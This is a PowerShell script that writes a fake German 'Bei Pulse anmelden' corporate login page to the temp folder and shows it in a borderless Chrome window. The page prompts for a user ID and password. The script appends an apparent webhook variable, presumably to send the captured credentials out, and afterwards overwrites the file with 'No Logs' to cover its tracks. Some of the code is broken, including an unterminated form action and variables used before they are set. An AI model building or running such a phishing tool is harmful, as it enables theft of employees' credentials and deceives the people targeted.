#========================================== WINDOW ONE (SETUP) =====================================================
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$htmlcode1 = @"
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link type="image/x-icon" rel="shortcut icon" href="favicon.ico">
<title>Bei Pulse anmelden</title>
<style>

[class^="icon-"],[class*=" icon-"] {
    font-family: 'unily-identity-provider' !important;
    font-style: normal;
    font-weight: normal;
    font-variant: normal;
    text-transform: none;
    line-height: 1;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale
}

.icon-facebook:before {
    content: "\e900"
}

.icon-linkedin:before {
    content: "\e902"
}

.icon-microsoft:before {
    content: "\e903"
}

.icon-windows:before {
    content: "\e904"
}

*,*:before,*:after {
    box-sizing: border-box
}

html {
    min-height: 100%;
    font-family: "Montserrat",Helvetica,Arial,sans-serif;
    font-size: 16px;
    -webkit-tap-highlight-color: transparent
}

body {
    display: flex;
    background: #fff;
    background-size: cover;
    background-position: center;
    min-height: 100%;
    margin: 0;
    padding: 0 40px
}

@media (max-width: 767px) {
    body {
        padding:20px
    }
}

.ip {
    display: flex;
    width: 100%
}

.ip form {
    display: flex;
    flex-direction: column;
    align-items: center;
    align-self: flex-start;
    background-color: #fff;
    color: #5F6A71;
    margin: 85px auto 20px;
    width: 750px;
    max-width: 100%;
    padding: 30px;
    border: none;
    border-radius: 3px;
    box-shadow: none
}

@media (max-width: 767px) {
    .ip form {
        margin:0 auto;
        padding: 20px 10px
    }
}

.ip__logo {
    max-height: 80px;
    margin-bottom: 40px;
    max-width: 80%
}

@media (max-width: 767px) {
    .ip__logo {
        max-width:70%;
        margin-bottom: 30px
    }
}

.ip__title {
    max-width: 100%;
    font-size: 40px;
    font-weight: 400;
    text-align: center;
    margin-bottom: 55px
}

.ip__title__email {
    color: #E9501D
}

.ip__title__Password {
    color: #E9501D
}


.ip__title__error {
    color: #D9534F;
    font-weight: 700
}

.ip__title>span {
    display: block;
    font-size: 18px;
    line-height: 1.5em;
    margin-top: 5px
}

@media (max-width: 767px) {
    .ip__title {
        font-size:30px;
        margin-bottom: 30px
    }

    .ip__title>span {
        font-size: 15px
    }
}

.ip__email-input {
    display: block;
    background: #fff;
    color: #5F6A71;
    border-radius: 5px;
    height: 60px;
    max-width: 630px;
    width: 100%;
    font-size: 16px;
    line-height: 40px;
    padding: 10px 15px;
    margin-bottom: 15px;
    font-family: inherit;
    background-image: none;
    border: 1px solid transparent;
    box-shadow: none;
    transition: border-color .35s ease-in-out;
    pointer-events: all !important
}

.ip__email-input.invalid {
    border: 2px solid #D9534F
}

@media (max-width: 767px) {
    .ip__email-input {
        height:40px;
        font-size: 16px;
        line-height: 20px;
        padding: 10px 15px;
        text-align: center
    }
}

.ip__Password-input {
    display: block;
    background: #fff;
    color: #5F6A71;
    border-radius: 5px;
    height: 60px;
    max-width: 630px;
    width: 100%;
    font-size: 16px;
    line-height: 40px;
    padding: 10px 15px;
    margin-bottom: 15px;
    font-family: inherit;
    background-image: none;
    border: 1px solid transparent;
    box-shadow: none;
    transition: border-color .35s ease-in-out;
    pointer-events: all !important
}

.ip__Password-input.invalid {
    border: 2px solid #D9534F
}

@media (max-width: 767px) {
    .ip__Password-input {
        height:40px;
        font-size: 16px;
        line-height: 20px;
        padding: 10px 15px;
        text-align: center
    }
}


.ip__check-box input[type="checkbox"] {
    width: 0;
    height: 0;
    margin: 0;
    float: left;
    opacity: 0
}

.ip__check-box input[type="checkbox"]~label {
    display: block;
    color: #5F6A71;
    margin: 10px auto;
    padding: 4px 4px 4px 44px;
    position: relative;
    cursor: pointer;
    height: 38px;
    line-height: 30px
}

.ip__check-box input[type="checkbox"]~label:hover {
    color: #E9501D
}

.ip__check-box input[type="checkbox"]~label:before {
    content: "";
    display: block;
    height: 30px;
    width: 30px;
    background: #5F6A71;
    border: 1px solid #5F6A71;
    border-radius: 2px;
    position: absolute;
    left: 4px
}

.ip__check-box input[type="checkbox"]:checked~label:after {
    content: "";
    display: block;
    position: absolute;
    top: 9px;
    left: 15px;
    width: 9px;
    height: 17px;
    border: solid #E9501D;
    border-width: 0 4px 4px 0;
    -webkit-transform: rotate(45deg);
    -ms-transform: rotate(45deg);
    transform: rotate(45deg)
}

.ip__check-box input[type="checkbox"]:focus-visible~label {
    box-shadow: 0 0 0 .15rem #fff;
    outline: .15rem solid #000000 !important;
    outline-offset: .15rem;
    border-radius: 2px
}

@media (max-width: 767px) {
    .ip__check-box input[type="checkbox"]~label {
        padding:4px 5px 4px 36px;
        height: 28px;
        line-height: 22px
    }

    .ip__check-box input[type="checkbox"]~label:before {
        height: 20px;
        width: 20px;
        left: 4px
    }

    .ip__check-box input[type="checkbox"]:checked~label:after {
        top: 6px;
        left: 10px;
        width: 8px;
        height: 14px
    }
}

.ip__error {
    color: #D9534F;
    font-weight: 700;
    margin: 10px auto;
    font-size: 18px
}

.ip__providers {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 100%;
    margin: 15px auto 0
}

.ip__providers .btn:not(.btn-success):not(.btn-primary):not(.btn-info) {
    display: flex;
    justify-content: center;
    align-items: center;
    align-content: center;
    padding-left: 20px;
    text-align: center
}

.ip__providers .btn [class^="icon-"],.ip__providers .btn [class*="icon-"] {
    position: relative;
    left: auto;
    top: -2px;
    width: 30px;
    -webkit-transform: none;
    transform: none;
    margin-right: 10px
}

.ip__providers .btn [class^="icon-"]:before,.ip__providers .btn [class*="icon-"]:before {
    display: block;
    transform: translateY(-50%);
    top: 50%;
    position: absolute
}

.btn {
    min-height: 60px;
    max-width: 630px;
    width: 100%;
    font-size: 18px;
    line-height: 24px;
    padding: 10px 20px 6px;
    margin-bottom: 15px;
    text-transform: none;
    border-radius: 5px;
    font-weight: 700;
    border: none;
    cursor: pointer;
    -webkit-transition: background .2s ease-in-out;
    transition: background .2s ease-in-out;
    position: relative
}

a.btn {
    text-decoration: none;
    text-align: center;
    line-height: 44px
}

@media (max-width: 767px) {
    a.btn {
        line-height:24px
    }
}

.btn.disabled,.btn[disabled],.btn.disabled:hover,.btn[disabled]:hover,.btn.disabled:focus,.btn[disabled]:focus {
    opacity: .7;
    cursor: not-allowed
}

.btn:not(.btn-success):not(.btn-primary):not(.btn-info) {
    text-align: left;
    padding-left: 60px
}

.btn [class^="icon-"],.btn [class*=" icon-"] {
    display: inline-block;
    width: 26px;
    font-size: 26px;
    position: absolute;
    top: 50%;
    left: 20px;
    -webkit-transform: translateY(-50%);
    transform: translateY(-50%)
}

.btn .icon-google {
    height: 28px;
    background: url('https://intranet.eliagroup.eu/Fallback/Assets/google-g-logo.svg') center / cover
}

@media (max-width: 767px) {
    .btn {
        min-height:40px;
        font-size: 14px
    }
}

.btn-success {
    color: #fff;
    background-color: #83AE00
}

.btn-success:hover,.btn-success:focus {
    color: #fff;
    background-color: #5d7b00
}

.btn-success.disabled,.btn-success[disabled],.btn-success.disabled:hover,.btn-success[disabled]:hover,.btn-success.disabled:focus,.btn-success[disabled]:focus {
    background-color: #83AE00;
    border-color: #709500
}

.btn-primary {
    color: #fff;
    background-color: #E9501D
}

.btn-primary:hover,.btn-primary:focus {
    color: #fff;
    background-color: #c03e13
}

.btn-primary.disabled,.btn-primary[disabled],.btn-primary.disabled:hover,.btn-primary[disabled]:hover,.btn-primary.disabled:focus,.btn-primary[disabled]:focus {
    background-color: #E9501D;
    border-color: #d84615
}

.btn-info {
    color: #5F6A71;
    background-color: #F4F4F4
}

.btn-info:hover,.btn-info:focus {
    color: #5F6A71;
    background-color: #dbdbdb
}

.btn-info.disabled,.btn-info[disabled],.btn-info.disabled:hover,.btn-info[disabled]:hover,.btn-info.disabled:focus,.btn-info[disabled]:focus {
    background-color: #F4F4F4;
    border-color: #cecece
}

.btn-linkedin {
    color: #fff;
    background-color: #0077b5
}

.btn-linkedin:hover,.btn-linkedin:focus {
    background-color: #005582
}

.btn-google {
    color: #5F6A71;
    background-color: #fff
}

.btn-google:hover,.btn-google:focus {
    background-color: #d9d9d9
}

.btn-facebook {
    color: #fff;
    background-color: #3B5998
}

.btn-facebook:hover,.btn-facebook:focus {
    background-color: #2d4373
}

.btn-windows {
    color: #fff;
    background-color: #E9501D
}

.btn-windows:hover,.btn-windows:focus {
    background-color: #c03e13
}

.sr-only {
    position: absolute;
    width: 1px;
    height: 1px;
    margin: -1px;
    padding: 0;
    overflow: hidden;
    clip: rect(0, 0, 0, 0);
    border: 0;
    white-space: nowrap
}

.ip #submit-button {
    background-color: #E9501D
}

.ip #submit-button:hover,.ip #submit-button:focus {
    background-color: #c03e13
}

.ip .ip__email-input {
    background-color: #e6e6e6
}

.ip .ip__Password-input {
    background-color: #e6e6e6
}


.ip .ip__check-box input[type="checkbox"]~label:before {
    background-color: #e6e6e6;
    border-color: #e6e6e6
}

</style>
</head>
<body>
    <main class="ip">
        

<form action="Pulslogin.HTML
<input name="__RequestVerificationToken" type="hidden" value="G5hdYw4jkcHXIwje2z1CcjeUH9Oi09hmEfQjRGIk9B38Tf0i-Gbeb4Kl1XYsXtRr36HM3DHzAVrVJsNbNSCWAnb1F3gvIZ4VcBQ0PJs8VFI1">
<input id="DisplayLanguage" name="DisplayLanguage" type="hidden" value="de-DE">  
  <img class="ip__logo" src="header-logo.png" alt="Logo">
    <label class="ip__title" for="email">
        Bei Pulse anmelden
        <span>Um sich anzumelden, loggen Sie sich mit Ihrer registrierten user ID ein  .</span>
    </label>
<input autofocus="autofocus" class="ip__email-input" id="Email" name="Email" oninput="validate()" placeholder="Geben Sie hier Ihre User ID ein" spellcheck="false" type="email" value="">
<input autofocus="autofocus" class="ip__Password-input" id="Password" name="Password" oninput="validate()" placeholder="Geben Sie hier Ihr Passwort ein" spellcheck="false" type="password" value="">  
  <button type="submit" class="btn btn-success" id="submit-button">Anmelden</button>
        <div class="ip__check-box">
            <input checked="checked" id="RememberMe" name="RememberMe" type="checkbox" value="true">
<input name="RememberMe" type="hidden" value="false">
            <label class="small" for="RememberMe" tabindex="-1">Meine user ID speichern</label>
        </div>
</form>


    </main>
    
    <script>
        var submitButton = document.getElementById("submit-button");
        var emailInput = document.getElementById("Email");

        function validate() {
            if (emailInput.value.length) {
                submitButton.removeAttribute("disabled");
            } else {
                submitButton.setAttribute("disabled", "disabled");
            }
        }


        // Run validate on page load, as email may be pre-populated
        window.onload = function () {
            validate();
        };

        (function () {
            document.documentElement.lang = navigator.language;
        })();

        var passwordInput = document.getElementById("Password");

        function validate() {
            if (passwordInput.value.length) {
                submitButton.removeAttribute("disabled");
            } else {
                submitButton.setAttribute("disabled", "disabled");
            }
        }


        // Run validate on page load, as Password may be pre-populated
        window.onload = function () {
            validate();
        };

        (function () {
            document.documentElement.lang = navigator.language;
        })();
    </script>



</body>
</html>
"@


$htmlFile = "$env:temp\Pulslogin.html"
$htmlcode1 | Out-File $htmlFile -Force
$webhk | Out-File $htmlFile -Append -Force
$htmlcode2 | Out-File $htmlFile -Append -Force


$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$screenWidth = $screen.WorkingArea.Width
$screenHeight = $screen.WorkingArea.Height
$left = ($screenWidth - $width) / 2
$top = ($screenHeight - $height) / 2
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$width = 530
$height = 600

$arguments = "--new-window --window-position=$left,$top --window-size=$width,$height --app=$htmlFile"
$chromeProcess = Start-Process -FilePath $chromePath -ArgumentList $arguments -PassThru
$chromeProcess.WaitForExit()

sleep 2
$outword = "No Logs"
$outword | Out-File $htmlFile -Force
sleep 1